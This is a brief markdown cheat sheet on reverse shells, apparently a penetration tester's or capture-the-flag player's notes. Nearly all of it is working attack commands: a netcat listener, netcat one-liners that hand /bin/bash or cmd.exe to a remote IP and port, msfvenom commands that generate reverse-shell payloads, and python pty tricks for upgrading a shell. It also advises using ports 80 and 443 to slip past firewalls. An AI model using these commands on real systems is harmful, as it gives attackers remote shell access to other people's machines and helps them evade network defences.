# All about reverse shells

* Try always using ports: 80 or 443 if open

# Reverse shells

* Firewall allow mostly outbound connections, that's why rever shell is so popular.
* You always need a listener to connect a rev shell to
`nc -lvnp <PORT>`
* by <PORT> selection try using ports 80, 443 because they are mostly not blocked by firewalls

## Netcat

* Necat: 
```
# Linux
nc <IP> <PORT> -e /bin/bash

# Windows
nc.exe <IP> <PORT> -e cmd.exe

```

## Reverse Shell payload 

`msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.xxx.xxx LPORT=443 -f python`

`msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888`

# Shell Upgrade

* The bind/reverse shell is not always fully interactive
* Python trick can be used to make it such

<code> python -c 'import pty; pty.spawn("/bin/bash")' </code><br>
<code> python3 -c 'import pty;pty.spawn("/bin/bash")' </code>

* Using script
'script /dev/null -c bash'
